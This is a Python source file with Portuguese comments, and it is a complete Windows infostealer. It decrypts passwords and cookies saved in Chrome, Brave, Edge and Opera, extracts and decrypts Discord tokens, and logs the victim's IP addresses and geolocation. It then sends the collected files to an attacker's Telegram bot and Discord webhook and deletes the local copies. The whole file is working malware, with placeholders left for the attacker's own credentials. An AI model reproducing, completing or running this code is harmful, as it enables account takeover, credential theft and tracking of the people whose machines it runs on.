import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
import win32crypt
from Crypto.Cipher import AES
from requests import post
import socket
import requests 

# ------------------- Configurações de Caminho -------------------

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
    'Discord': f"{roaming}\\Discord",
    'Discord Canary': f"{roaming}\\discordcanary",
    'Discord PTB': f"{roaming}\\discordptb",
    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
}

browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

fileCookies = "cookies_" + os.getlogin() + ".txt"
filePass = "senhas_" + os.getlogin() + ".txt"
fileInfo = "info_" + os.getlogin() + ".txt"

# ------------------- Perfis dos Navegadores -------------------

for browser, path in list(browser_loc.items()):
    if os.path.exists(path + "\\User Data"):
        for profile in os.listdir(path + "\\User Data"):
            if profile.startswith("Profile") or profile == "Default":
                browser_loc[f"{browser}_{profile}"] = f"{path}\\User Data\\{profile}"

# ------------------- Tokens do Discord -------------------

def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass

def get_tokens(path):
    limpo = []
    tokens = []
    finalizado = []
    lev_db = f"{path}\\Local Storage\\leveldb\\"
    loc_state = f"{path}\\Local State"
    
    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file in os.listdir(lev_db):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(lev_db + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in limpo:
                limpo.append(i)
        for token in limpo:
            finalizado += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
    else:
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            finalizado.append(token)
            except:
                continue

    return finalizado

# ------------------- Funções para Descriptografar -------------------

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

# ------------------- Descriptografar Dados do Navegador -------------------

def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            with connect("TempMan.db") as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(filePass, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nNome: {logins[1]}\nSenha: {dec_pass}\n\n"
                    with open(filePass, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"{name} Arquivo Login Data não encontrado\n")
        
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            with connect("CookMe.db") as conn:
                curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            with open(fileCookies, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nNome: {cookies[1]}\nCookie: {dec_pass}\n\n'
                    with open(fileCookies, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, "a") as f:
                f.write(f"{name} Arquivo de Cookie não encontrado\n")
    else:
        with open(fileInfo, "a") as f:
            f.write(f"{name} Arquivo Local State não encontrado\n")

# ------------------- Funções Auxiliares de Caminho -------------------
def Local_State(path):
    return f"{path}\\Local State"

def Login_Data(path):
    return f"{path}\\Login Data"

def Cookies(path):
    return f"{path}\\Network\\Cookies"

# ------------------- Manipulação de Tokens -------------------
def main_tokens():
    for plataforma, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue
        with open(fileInfo, "a") as f:
            for i in tokens:
                f.write(str(i) + "\n")

def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
    else:
        with open(fileInfo, "a") as f:
            f.write(browser + " não instalado\n")

# ------------------- Envio para Webhook -------------------
def post_to(file):
    token = "TOKEN DO TELEGRAM"
    chat_id = "ID DO CHAT DO TELEGRAM"
    webhook_url = "URL WEBHOOK DISCORD"
    
    if token != "TOKEN DO TELEGRAM" and chat_id != "ID DO CHAT DO TELEGRAM":
        post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chat_id},
             files={'document': open(file, 'rb')})
    
    if webhook_url != "URL DO WEBHOOK":
        post(webhook_url, files={'files': open(file, 'rb')})

# ------------------- Manipulação de Arquivos -------------------
for_handler = (fileInfo, filePass, fileCookies, "TempMan.db", "CookMe.db")

def file_handler(file):
    if os.path.exists(file):
        if ".txt" in file:
            post_to(file)
        os.remove(file)

# ------------------- Função para Capturar Geolocalização -------------------
def capturar_geolocalizacao():
    try:
        # Obter o IP público
        ip_publico = requests.get('https://api.ipify.org').text

        # Obter o IP privado
        ip_privado = socket.gethostbyname(socket.gethostname())

        # Obter geolocalização a partir do IP público
        resposta_geo = requests.get(f'https://ipinfo.io/{ip_publico}/json')
        if resposta_geo.status_code == 200:
            dados_geo = resposta_geo.json()
            cidade = dados_geo.get('city', 'Não disponível')
            regiao = dados_geo.get('region', 'Não disponível')
            pais = dados_geo.get('country', 'Não disponível')
            loc = dados_geo.get('loc', 'Não disponível')  # Latitude e Longitude

            # Escrever as informações no arquivo
            with open(fileInfo, "a") as f:
                f.write(f"IP Público {ip_publico}\n")
                f.write(f"IP Privado {ip_privado}\n")
                f.write(f"Cidade {cidade}\n")
                f.write(f"Região {regiao}\n")
                f.write(f"País {pais}\n")
                f.write(f"Localização (Lat, Long) {loc}\n")
        else:
            with open(fileInfo, "a") as f:
                f.write("Não foi possível obter as informações de geolocalização\n")
    except Exception as e:
        with open(fileInfo, "a") as f:
            f.write(f"\nErro ao obter informações de geolocalização\n{str(e)}\n")

# ------------------- Função Principal -------------------
def main():
    # Capturar geolocalização antes de coletar outras informações
    capturar_geolocalizacao()
    
    for nome, path in browser_loc.items():
        decrypt_files(path, nome)
    main_tokens()
    for i in for_handler:
        file_handler(i)

main()
